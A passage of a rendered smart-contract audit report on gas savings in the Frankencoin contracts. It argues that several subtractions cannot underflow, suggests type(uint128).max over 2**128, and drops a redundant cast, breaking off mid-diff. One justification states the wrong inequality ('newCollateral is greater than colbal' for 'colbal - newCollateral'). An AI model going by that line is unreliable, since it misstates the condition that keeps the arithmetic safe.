class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">newCollateral</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">colbal</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operation <code>newCollateral - colbal</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L137\">Line 137</a> that ensures that <code>newCollateral</code> is greater than <code>colbal</code> before performing the arithmetic operation</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L142\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L142</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">142</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burnFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minted</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">newMinted</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reserveContribution</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operation <code>minted - newMinted</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L141\">Line 141</a> that ensures that <code>minted</code> is greater than <code>newMinted</code> before performing the arithmetic operation</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L146\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L146</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">withdrawCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">colbal</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">newCollateral</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operation <code>colbal - newCollateral</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L145\">Line 145</a> that ensures that <code>newCollateral</code> is greater than <code>colbal</code> before performing the arithmetic operation</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L150\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L150</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">150</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">newMinted</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">minted</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operation <code>newMinted - minted</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L149\">Line 149</a> that ensures that <code>newMinted</code> is greater than <code>minted</code> before performing the arithmetic operation</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L240-L243\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L240-L243</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notifyRepaidInternal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">minted</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RepaidTooMuch</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">minted</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">242</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">minted</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>There are two operations here <code>amount - minted</code> and <code>minted -= amount</code> , The two operations cannot underflow as they are both protected by the check <code>if (amount > minted)</code>. The first one would only be performed during a revert which would be as a result of <code>amount</code> being greater than <code>minted</code>\nThe second operation would be performed if we don’t hit the revert condition which would mean <code>minted</code> was greater than <code>amount</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L263\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L263</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MintingHub</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">263</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bid</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operation <code>challenge.bid - effectiveBid</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L261\">Line 261</a> that ensures that <code>challenge.bid</code> is greater than <code>effectiveBid</code> before performing the arithmetic operation</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L268\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L268</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MintingHub</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">268</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">fundsNeeded</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operation <code>effectiveBid - fundsNeeded</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L267\">Line 267</a> that ensures that <code>effectiveBid</code> is greater than <code>fundsNeeded</code> before performing the arithmetic operation</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L270\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L270</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MintingHub</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">270</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">notifyLoss</span><span class=\"mtk1\">(</span><span class=\"mtk12\">fundsNeeded</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// ensure we have enough to pay everything</span></span></span></code></pre>\n<p>The operation <code>fundsNeeded - effectiveBid</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L269\">Line 269</a> that ensures that <code>effectiveBid</code> is less than <code>fundsNeeded</code> before performing the arithmetic operation</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/ERC20.sol#L132\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/ERC20.sol#L132</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">_approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">currentAllowance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operation <code>currentAllowance - amount</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/ERC20.sol#L131\">Line 131</a> that ensures that this arithmetic operation would only be performed if <code>currentAllowance</code> is greater than <code>amount</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/ERC20.sol#L156\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/ERC20.sol#L156</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">_balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The above operation cannot underflow as we have a check on  <a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/ERC20.sol#L155\">Line 155</a> that ensures that\n<code>_balances[sender]</code> cannot be less than <code>amount</code> before we perform the subtractio</p>\n<h2 id=\"g-05-2n-should-be-re-written-as-typeuintnmax\" style=\"position:relative;\"><a href=\"#g-05-2n-should-be-re-written-as-typeuintnmax\" aria-label=\"g 05 2n should be re written as typeuintnmax permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] <code>2**&#x3C;n></code> should be re-written as <code>type(uint&#x3C;n>).max</code></h2>\n<p>Earlier versions of solidity can use <code>uint&#x3C;n>(-1)</code> instead. Expressions not including the <code>- 1</code> can often be re-written to accomodate the change (e.g. by using a <code>></code> rather than a <code>>=</code>, which will also save some gas)</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L241-L255\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Equity.sol#L241-L255</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Equity</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">253</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() &lt; </span><span class=\"mtk7\">2</span><span class=\"mtk1\">**</span><span class=\"mtk7\">128</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;total supply exceeded&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">254</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">255</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>As our operation didn’t include the <code>-1</code> we’ve changed the sign to <code>&#x3C;=</code> rather than just <code>&#x3C;</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/Equity.sol b/contracts/Equity.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 7057ed6..95816f3 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/Equity.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/Equity.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -250,7 +250,7 @@ contract Equity is ERC20PermitLight, MathUtil, IReserve {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // limit the total supply to a reasonable amount to guard against overflows with price and vote calculations</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // the 128 bits are 68 bits for magnitude and 60 bits for precision, as calculated in an above comment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        require(totalSupply() &lt; 2**128, &quot;total supply exceeded&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        require(totalSupply() &lt;= type(uint128).max , &quot;total supply exceeded&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<h2 id=\"g-06-unnecessary-casting-as-variable-is-already-of-the-same-type\" style=\"position:relative;\"><a href=\"#g-06-unnecessary-casting-as-variable-is-already-of-the-same-type\" aria-label=\"g 06 unnecessary casting as variable is already of the same type permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Unnecessary casting as variable is already of the same type</h2>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L124-L132\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L124-L132</a></p>\n<h3 id=\"mintinghubsolcloneposition-pos-should-not-be--cast-to-address-as-its-declared-as-an-address\" style=\"position:relative;\"><a href=\"#mintinghubsolcloneposition-pos-should-not-be--cast-to-address-as-its-declared-as-an-address\" aria-label=\"mintinghubsolcloneposition pos should not be  cast to address as its declared as an address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>MintingHub.sol.clonePosition(): pos should not be  cast to address as it’s declared as an address</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MintingHub</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">clonePosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_initialCollateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_initialMint</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">validPos</span><span class=\"mtk1\">(</span><span class=\"mtk12\">position</span><span class=\"mtk1\">) </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">IPosition</span><span class=\"mtk1\"> </span><span class=\"mtk12\">existing</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">position</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">126</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">limit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">existing</span><span class=\"mtk1\">.</span><span class=\"mtk11\">reduceLimitForClone</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_initialMint</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">127</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pos</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">POSITION_FACTORY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">clonePosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">position</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">128</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">.</span><span class=\"mtk11\">registerPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pos</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">129</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">existing</span><span class=\"mtk1\">.</span><span class=\"mtk11\">collateral</span><span class=\"mtk1\">().</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pos</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_initialCollateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">IPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pos</span><span class=\"mtk1\">).</span><span class=\"mtk11\">initializeClone</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existing</span><span class=\"mtk1\">.</span><span class=\"mtk11\">price</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">limit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_initialCollateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_initialMint</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pos</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/MintingHub.sol b/contracts/MintingHub.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 663b205..c69c0c2 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/MintingHub.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/MintingHub.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -126,9 +126,9 @@ contract MintingHub {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 limit = existing.reduceLimitForClone(_initialMint);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address pos = POSITION_FACTORY.clonePosition(position);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         zchf.registerPosition(pos);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        existing.collateral().transferFrom(msg.sender, address(pos), _initialCollateral);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        existing.collateral().transferFrom(msg.sender, pos, _initialCollateral);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         IPosition(pos).initializeClone(msg.sender, existing.price(), limit, _initialCollateral, _initialMint);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        return address(pos);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   